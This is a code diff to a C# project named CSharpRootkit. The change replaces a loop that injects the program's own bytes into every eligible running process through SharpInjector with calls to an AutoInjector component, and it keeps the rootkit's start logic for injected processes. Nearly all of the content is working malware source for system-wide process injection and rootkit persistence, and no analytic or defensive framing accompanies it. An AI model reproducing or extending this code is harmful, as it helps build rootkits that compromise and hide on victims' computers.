@@ -24,8 +24,9 @@ namespace CSharpRootkit
             RootKitInterface.AddInclusionExclusionProcessName("msbuild.exe");
             RootKitInterface.AddInclusionExclusionProcessName("devenv.exe");
             //Console.ReadLine();
-            InjectAllPossible();
-            //new Thread(InjectAllPossibleLoop).Start();
+            AutoInjector.Start(InjectionEntryPoint);
+
+
 
             Console.WriteLine("injected all");
             Console.WriteLine("pid, filename, processname, stop");
@@ -55,48 +56,10 @@ namespace CSharpRootkit
                 }
             }
             Console.WriteLine("done.");
+
+            AutoInjector.Stop();
             RootKitInterface.Stop();
             Console.ReadLine();
-        }
-
-
-        public static void InjectAllPossibleLoop() 
-        {
-            while (true) 
-            {
-                InjectAllPossible();
-                Thread.Sleep(1000);
-            }
-        }
-
-        public static void InjectAllPossible() 
-        {
-            byte[] selfBytes = Utils.GetCurrentSelfBytes();
-            foreach (Process proc in Process.GetProcesses())
-            {
-                if (!RootKitInterface.started || proc.Id == NativeMethods.GetCurrentProcessId() || proc.ProcessName.ToLower() == "devenv" || proc.ProcessName.ToLower() == "msbuild") 
-                {
-                    proc.Dispose();
-                    continue;
-                }
-
-                uint currentProcId = NativeMethods.GetCurrentProcessId();
-
-                if (!Utils.GetParentProcess(proc.Id, out int parentProc) || (uint)parentProc == currentProcId) //make sure its not a subprocess, for example if c# spawns a conhost, injecting into it can cause a crash.
-                {
-                    continue;
-                }
-
-                IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights(proc.Id);
-                if (!RootKitInterface.IsAgainstInclusionExclusionRules(procHandle) && Utils.ShouldInject(procHandle))
-                {
-                    //Console.WriteLine(SharpInjector.Inject(procHandle, InjectionEntryPoint, 0));
-                    SharpInjector.Inject(procHandle, InjectionEntryPoint, 0);
-                }
-
-                NativeMethods.CloseHandle(procHandle);
-                proc.Dispose();
-            }
         }
 
 
@@ -110,17 +73,14 @@ namespace CSharpRootkit
         }
 
         public static void InjectionStartingPoint()
-        {            
+        {
             //NativeMethods.AllocConsole();
             //Console.WriteLine("om");
-            if (!Utils.setInjectionFlag(out bool alreadyInjected) || alreadyInjected) 
+            if (!Utils.setInjectionFlag(out bool alreadyInjected) || alreadyInjected)
             {
                 return;
             }
-
             RootKitClientInterface.Start();
-
-
         }
 
     }
